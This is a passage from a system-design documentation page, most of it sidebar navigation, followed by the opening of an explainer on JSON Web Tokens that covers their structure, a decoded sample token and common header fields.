    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/raft-consensus-algorithm/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Raft Consensus Algorithm
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/restfull-architecture/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    RESTful Architecture
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/s3/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    S3
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/scaling-to-one-million/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Scaling to One Million
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/sockets/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Sockets
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/storage/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Storage
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/concepts/webrtc/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    WebRTC
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_2_3" >
        
          
          <label class="md-nav__link" for="__nav_11_2_3" id="__nav_11_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Designing
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_11_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_2_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    Designing
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/app-store/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    App Store
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/authentication-system/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Authentication System
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/chat-system/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Chat System
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/chess-game/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Chess Game
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/data-warehouse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Data Warehouse
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/distributed-geospatial-data-platform/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Distributed Geospatial Data Platform
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/distributed-messaging-queue/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Distributed Messaging Queue
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/dns-server.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    DNS Server
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/e-commerce/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    E-Commerce
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/ecommerce-checkout/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    E-Commerce Checkout
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/email-automation-platform/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Email Automation Platform
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/food-delivery/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Food Delivery
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/google-drive/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Google Drive
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/hashtag-service/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Hashtag Service
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/how-to-host-your-own-x/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    How to Host Your Own X
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/Image-Optimisation-on-the-fly/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Image Optimisation On The Fly
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/key-value-store/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Key Value Store
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/large-language-model/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Large Language Model
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/leetcode/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    LeetCode
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/live-comments/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Live Comments
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/log-system/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Log System
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/multiplayer-game/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Multiplayer Game
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/netflix/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Netflix
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/notification-system/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Notification System
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/products/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Products
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/rate-limiter/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Rate Limiter
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/recomendation-engine/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Recommendation Engine
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/redis/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Redis
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/search-engine/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Search Engine
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/social-media/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Social Media
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/spotify/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Spotify
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/stock-broker-system/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Stock Broker System
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/tiny-url/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Tiny URL
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/twitter/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Twitter
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/uber/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Uber
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/upi-payments/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    UPI Payments
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/video-streaming/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Video Streaming
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/vpn/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    VPN
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/webhook/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Webhook
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/desgining/yelp/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Yelp
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_2_4" >
        
          
          <label class="md-nav__link" for="__nav_11_2_4" id="__nav_11_2_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Links
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_11_2_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_2_4">
            <span class="md-nav__icon md-icon"></span>
            
  
    Links
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/links/udemy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Udemy
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/links/websites/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Websites
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/high-level/links/youtube/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    YouTube
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_3" >
        
          
          <label class="md-nav__link" for="__nav_11_3" id="__nav_11_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Low Level Design
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    Low Level Design
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Overview
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_3_2" >
        
          
          <label class="md-nav__link" for="__nav_11_3_2" id="__nav_11_3_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Concepts
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_11_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_3_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Concepts
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/concepts/hashmap/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    HashMap
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/concepts/solid-principles/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    SOLID Principles
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/concepts/technical-debt/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Technical Debt
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_3_3" >
        
          
          <label class="md-nav__link" for="__nav_11_3_3" id="__nav_11_3_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Design Patterns
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_11_3_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_3_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    Design Patterns
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/design-pattern/design-pattern/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Design Pattern
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_3_3_2" >
        
          
          <label class="md-nav__link" for="__nav_11_3_3_2" id="__nav_11_3_3_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Others
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_11_3_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_3_3_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Others
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/design-pattern/others/null-object-pattern/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Null Object Pattern
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_3_4" >
        
          
          <label class="md-nav__link" for="__nav_11_3_4" id="__nav_11_3_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Designing
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_11_3_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_3_4">
            <span class="md-nav__icon md-icon"></span>
            
  
    Designing
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/designing/access-management-system/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Access Management System
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/designing/account-balance-tracker/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Account Balance Tracker
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/designing/air-traffic-controller/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Air Traffic Controller
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/designing/atm/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    ATM
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/designing/cache-system/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Cache System
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/designing/car-rental-service/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Car Rental Service
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/designing/chess-game/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Chess Game
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/designing/elevator-system/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Elevator System
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/designing/locker-allocation-system/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Locker Allocation System
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/designing/parking-lot/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Parking Lot
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/designing/snake-and-ladder/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Snake and Ladder
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/designing/stock-exchange-book/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Stock Exchange Book
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/designing/tic-tac-toe/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Tic Tac Toe
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../system-design/low-level/designing/vending-machine/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Vending Machine
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              
              <article class="md-content__inner md-typeset">
                
                  



<h1 id="jwt-json-web-token">JWT (JSON Web Token)</h1>
<h2 id="youtube">Youtube</h2>
<ul>
<li><a href="https://www.youtube.com/watch?v=gjVYRl167RQ">JWT Explained | JWT vs SessionID | JSON Web Token | Security Challenges with JWT &amp; its Handling</a></li>
</ul>
<h2 id="theory">Theory</h2>
<h3 id="what-is-jwt-json-web-token">What is JWT (JSON Web Token)?</h3>
<p><strong>JWT</strong> is a compact, URL-safe token format for securely transmitting information between parties as a JSON object. It's digitally signed (and optionally encrypted) to verify authenticity and integrity.</p>
<p><strong>Key Characteristics:</strong>
- <strong>Self-contained</strong>: Contains all necessary user information (no database lookup needed)
- <strong>Stateless</strong>: Server doesn't need to store session data
- <strong>Compact</strong>: Small size, easy to pass in HTTP headers/URLs
- <strong>Signed</strong>: Cryptographically verified for authenticity
- <strong>Standardized</strong>: RFC 7519 specification</p>
<p><strong>Common Use Cases:</strong>
- Authentication (login sessions)
- Single Sign-On (SSO)
- API authorization
- Information exchange
- Mobile app authentication</p>
<hr />
<h2 id="jwt-structure">JWT Structure</h2>
<p>A JWT consists of three parts separated by dots (<code>.</code>):</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>                         JWT Structure                          
<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>                                                                 
<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.                        
<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>                           
<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>         HEADER (Base64URL)                                      
<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>                                                                 
<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>  eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0Ijo 
<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>  xNTE2MjM5MDIyfQ.                                              
<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>              
<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>         PAYLOAD (Base64URL)                                     
<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>                                                                 
<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>  SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c                   
<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>                     
<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>         SIGNATURE (Base64URL)                                   
<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>                                                                 
<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>
<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>
<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>Format: HEADER.PAYLOAD.SIGNATURE
</code></pre></div>
<h3 id="complete-example">Complete Example</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>When decoded:
<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>HEADER:
<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>{
<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>  &quot;alg&quot;: &quot;HS256&quot;,
<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>  &quot;typ&quot;: &quot;JWT&quot;
<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>}
<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>
<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>PAYLOAD:
<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>{
<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>  &quot;sub&quot;: &quot;1234567890&quot;,
<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>  &quot;name&quot;: &quot;John Doe&quot;,
<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>  &quot;iat&quot;: 1516239022
<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>}
<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>
<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>SIGNATURE:
<a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>HMACSHA256(
<a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>  base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload),
<a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>  secret
<a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>)
</code></pre></div>
<hr />
<h2 id="part-1-header">Part 1: Header</h2>
<p>The header typically consists of two parts:
1. <strong>Token type</strong> (<code>typ</code>): "JWT"
2. <strong>Signing algorithm</strong> (<code>alg</code>): HS256, RS256, etc.</p>
<h3 id="common-header-properties">Common Header Properties</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">{</span>
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">  </span><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;HS256&quot;</span><span class="p">,</span><span class="w">        </span><span class="c1">// Algorithm (REQUIRED)</span>
<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">  </span><span class="nt">&quot;typ&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;JWT&quot;</span><span class="p">,</span><span class="w">          </span><span class="c1">// Type (OPTIONAL but recommended)</span>
